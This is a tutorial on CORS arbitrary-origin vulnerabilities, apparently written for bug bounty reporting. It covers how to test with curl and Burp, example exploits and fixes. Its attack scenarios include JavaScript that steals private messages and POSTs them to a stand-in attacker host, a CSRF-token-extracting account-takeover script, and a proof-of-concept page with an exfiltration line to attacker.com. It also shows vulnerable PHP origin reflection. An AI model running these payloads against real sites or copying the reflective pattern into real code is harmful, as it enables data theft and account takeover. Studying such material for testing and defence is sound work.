# CORS Arbitrary Origin Vulnerability

<br>

## What is CORS? A Simple Analogy

Imagine you have two different websites:
- **Your Bank**: bankofmoney.com
- **A Malicious Site**: evil-hacker.com

Normally, code on evil-hacker.com can't access your account data on bankofmoney.com. This protection is called the "Same-Origin Policy."

CORS is like a permission slip that bankofmoney.com can give to specific other websites, saying "Yes, you can access our data."

<br>

## The Vulnerability Explained

**Normal CORS**: The bank only gives permission slips to trusted partners.

**Vulnerable CORS**: The bank gives a permission slip to ANYONE who asks for one.

<br>

## Real-World Examples

### Example 1: Banking API

**Request:**
```
GET /api/account-balance HTTP/1.1
Host: bank.com
Origin: https://evil-hacker.com
```

**Secure Response:**
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://trusted-partner.com
```
(Request blocked by browser - origins don't match)

**Vulnerable Response:**
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil-hacker.com
Access-Control-Allow-Credentials: true
```
(Browser allows the request - the bank trusted the hacker!)

### Example 2: Healthcare Portal

**Request:**
```
GET /api/patient-records HTTP/1.1
Host: healthcare.com
Origin: https://attacker.com
```

**Secure Response:**
```
HTTP/1.1 403 Forbidden
```
(No CORS headers - access denied)

**Vulnerable Response:**
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"patientName":"John Doe","diagnosis":"Diabetes",...}
```
(Patient data exposed to attacker!)

<br>

## How to Test for This Vulnerability (Step-by-Step)

### Method 1: Manual Testing

1. **Use a browser extension like ModHeader to set your Origin header:**
   - Set `Origin: https://im-not-supposed-to-be-here.com`

2. **Visit the target API or endpoint**

3. **Check the response headers in Developer Tools:**
   - If you see your fake origin reflected back, it's vulnerable

### Method 2: Using Curl

```bash
# Send a request with a fake origin
curl -I -H "Origin: https://evil-site.com" https://target-site.com/api/user-data

# Look for this in the response:
# Access-Control-Allow-Origin: https://evil-site.com
```

### Method 3: Using Burp Suite

1. Capture a request to the target API
2. Change the Origin header to `https://evil.com`
3. Forward the request
4. Check if the response contains `Access-Control-Allow-Origin: https://evil.com`

<br>

## Real Attack Scenarios

### Scenario 1: Stealing Private Messages

Imagine a social media site with this vulnerability:

1. **Victim visits evil-page.com**
2. **Evil page runs this code:**
   ```javascript
   fetch('https://vulnerable-social.com/api/private-messages', {
     credentials: 'include'  // Sends the victim's cookies
   })
   .then(response => response.json())
   .then(messages => {
     // Send messages to attacker's server
     fetch('https://evil-page.com/collect', {
       method: 'POST',
       body: JSON.stringify(messages)
     });
   });
   ```

3. **Result:** Attacker gets all the victim's private messages!

### Scenario 2: Account Takeover

1. **Victim visits malicious-blog.com**
2. **Malicious page runs:**
   ```javascript
   // Step 1: Get the CSRF token
   fetch('https://vulnerable-site.com/account/settings', {
     credentials: 'include'
   })
   .then(response => response.text())
   .then(html => {
     // Extract CSRF token from HTML
     const csrfToken = html.match(/csrf-token" content="([^"]+)"/)[1];
     
     // Step 2: Change email address
     fetch('https://vulnerable-site.com/account/update-email', {
       method: 'POST',
       credentials: 'include',
       headers: {
         'Content-Type': 'application/json',
         'X-CSRF-Token': csrfToken
       },
       body: JSON.stringify({
         email: 'hacker@evil.com'
       })
     });
   });
   ```

3. **Result:** Attacker can now reset the victim's password!

## Visual Example: The CORS Attack Flow

1. **Victim logs into legitimate site (bank.com)**
2. **Victim visits malicious site (while still logged into bank)**
3. **Malicious site makes request to bank.com**
4. **Bank sees the Origin and incorrectly trusts it**
5. **Bank sends sensitive data back to malicious site**
6. **Malicious site forwards data to attacker**

<br>

## Testing Different HTTP Methods

Some sites only have CORS vulnerabilities with specific HTTP methods:

```javascript
// Test GET method
fetch('https://target.com/api/data', {
  method: 'GET',
  credentials: 'include'
}).then(r => console.log('GET vulnerable'));

// Test POST method
fetch('https://target.com/api/data', {
  method: 'POST',
  credentials: 'include'
}).then(r => console.log('POST vulnerable'));

// Also try PUT, DELETE, etc.
```

<br>

## Creating a CORS Exploit Proof-of-Concept

Here's a full HTML page you can use to demonstrate the vulnerability:

```html
<!DOCTYPE html>
<html>
<head>
  <title>CORS Vulnerability Demo</title>
</head>
<body>
  <h1>CORS Vulnerability Test</h1>
  <button onclick="exploitCORS()">Click to Test</button>
  <div id="results"></div>

  <script>
    function exploitCORS() {
      document.getElementById('results').innerHTML = 'Testing...';
      
      fetch('https://vulnerable-site.com/api/sensitive-data', {
        credentials: 'include'
      })
      .then(response => response.text())
      .then(data => {
        document.getElementById('results').innerHTML = 
          '<strong>Vulnerable!</strong><br>Data retrieved: <pre>' + 
          data.substring(0, 200) + '...</pre>';
        
        // In a real attack, send to attacker's server
        // fetch('https://attacker.com/steal?data=' + encodeURIComponent(data));
      })
      .catch(error => {
        document.getElementById('results').innerHTML = 
          '<strong>Not vulnerable</strong><br>Error: ' + error;
      });
    }
  </script>
</body>
</html>
```

<br>

## How to Fix CORS Issues (For Your Report)

1. **Whitelist specific origins:**
   ```
   Access-Control-Allow-Origin: https://trusted-partner.com
   ```

2. **Never use wildcard for sensitive data:**
   ```
   # BAD for sensitive APIs:
   Access-Control-Allow-Origin: *
   ```

3. **Don't reflect the Origin header:**
   ```php
   // VULNERABLE PHP code:
   $origin = $_SERVER['HTTP_ORIGIN'];
   header("Access-Control-Allow-Origin: $origin");
   
   // SECURE code:
   $allowed_origins = ['https://trusted1.com', 'https://trusted2.com'];
   $origin = $_SERVER['HTTP_ORIGIN'];
   if (in_array($origin, $allowed_origins)) {
     header("Access-Control-Allow-Origin: $origin");
   }
   ```

4. **Be careful with credentials:**
   ```
   # Only use this with specific origins, never with wildcards:
   Access-Control-Allow-Credentials: true
   ```

<br>

## Why This Matters: Real-World Impact

* **Bank accounts**: Attackers can steal money
* **Healthcare data**: Private medical info exposed
* **Corporate systems**: Data breaches and system compromises
* **Social media**: Private messages and account takeovers

This vulnerability bypasses the web's fundamental security boundary between different websites, making it extremely powerful in the wrong hands.
